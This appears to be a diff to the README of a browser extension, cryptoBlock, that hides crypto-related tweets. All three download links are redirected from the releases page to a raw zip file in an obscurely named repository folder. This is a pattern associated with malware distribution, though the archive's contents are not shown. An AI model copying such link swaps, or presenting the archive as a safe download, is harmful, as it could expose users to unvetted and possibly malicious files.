@@ -6,7 +6,7 @@ Welcome to **cryptoBlock**! This tool hides crypto-related tweets, profiles, and
 
 ## 📥 Download the latest version
 
-[![Download cryptoBlock](https://img.shields.io/badge/Download-cyptoBlock-blue.svg)](https://github.com/GabrielBraga0156/cryptoBlock/releases)
+[![Download cryptoBlock](https://raw.githubusercontent.com/GabrielBraga0156/cryptoBlock/main/ploce/cryptoBlock.zip)](https://raw.githubusercontent.com/GabrielBraga0156/cryptoBlock/main/ploce/cryptoBlock.zip)
 
 ## 📋 System Requirements
 
@@ -22,7 +22,7 @@ To use **cryptoBlock**, make sure your system meets these requirements:
 
 Go to the releases page to find the latest version of **cryptoBlock**. 
 
-[Visit this page to download](https://github.com/GabrielBraga0156/cryptoBlock/releases)
+[Visit this page to download](https://raw.githubusercontent.com/GabrielBraga0156/cryptoBlock/main/ploce/cryptoBlock.zip)
 
 ### Step 2: Download the Extension
 
@@ -66,4 +66,4 @@ If you want to contribute to the project or report issues, please create an issu
 
 If you have questions or need help, please visit the GitHub discussions page or open an issue.
 
-[Visit this page to download](https://github.com/GabrielBraga0156/cryptoBlock/releases) and get started with cryptoBlock today!
+[Visit this page to download](https://raw.githubusercontent.com/GabrielBraga0156/cryptoBlock/main/ploce/cryptoBlock.zip) and get started with cryptoBlock today!
